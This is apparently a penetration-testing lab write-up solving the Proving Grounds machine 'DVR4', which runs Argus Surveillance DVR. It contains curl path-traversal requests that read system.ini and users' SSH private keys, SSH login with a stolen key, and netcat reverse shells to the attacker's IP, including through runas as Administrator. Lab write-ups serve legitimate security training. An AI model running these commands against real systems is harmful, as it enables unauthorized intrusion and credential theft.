---
title: DVR4
date: 2026-01-18T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - hydra
  - winpeas
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: DVR4"
---

![](Screenshot%202026-01-06%20at%2014.51.38.png)![](Screenshot%202026-01-06%20at%2014.51.59.png)![](Screenshot%202026-01-06%20at%2014.52.26.png)![](Screenshot%202026-01-06%20at%2014.58.02.png)

There are a few exploits for Argus:

`searchsploit argus`

![](Screenshot%202026-01-07%20at%2008.26.22.png)

`curl "http://192.168.230.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini"`

![](Screenshot%202026-01-07%20at%2008.27.35.png)

Can confirm a working exploit. 
We may be able to find a ssh key using this.

`curl "http://192.168.234.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=../../../../../../../../Users/Administrator/.ssh/id_rsa"`

![](Screenshot%202026-01-07%20at%2008.30.42.png)

`curl "http://192.168.234.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=../../../../../../../../Users/viewer/.ssh/id_rsa"`

![](Screenshot%202026-01-07%20at%2008.25.07.png)

Save the key:

`curl "http://192.168.230.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=../../../../../../../../Users/viewer/.ssh/id_rsa" > viewer.key`

Persmissions:

`chmod 600 viewer.key`

SSH session

`ssh viewer@192.168.230.179 -i viewer.key`

![](Screenshot%202026-01-07%20at%2008.47.22.png)

![](Screenshot%202026-01-07%20at%2008.51.15.png)

`whoami /all`

![](Screenshot%202026-01-07%20at%2008.53.12.png)

 Not finding much, lets try WinPEAS:

`scp -i viewer.key winp.exe viewer@192.168.230.179:"/C:/Users/viewer/winp.exe"

![](Screenshot%202026-01-07%20at%2011.46.54.png)

No colour: 

nc.exe is in the viewer's home folder. Use this to set up a reverse shell. 

`nc.exe 192.168.45.188 1234 -e powershell`
		
		
![](Screenshot%202026-01-07%20at%2011.49.03.png)

WinPEAS wasn't much help to my pleby eyes. 
Back to searchsploit.

![](Screenshot%202026-01-07%20at%2014.34.09.png)

![](Screenshot%202026-01-07%20at%2014.35.09.png)

ProgramData is a hidden folder in C:\
Navigate through the directories and locate this file:
	C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini

![](Screenshot%202026-01-07%20at%2014.43.26.png)

![](Screenshot%202026-01-07%20at%2014.44.43.png)

Put the encrypted password into the python script.

![](Screenshot%202026-01-07%20at%2014.49.53.png)

No ssh it seems:

`runas /user:Administrator "C:\Users\viewer\nc.exe 192.168.45.188 80 -e powershell"`

![](Screenshot%202026-01-07%20at%2014.31.02.png)

![](Screenshot%202026-01-07%20at%2014.29.59.png)

9 hours... too long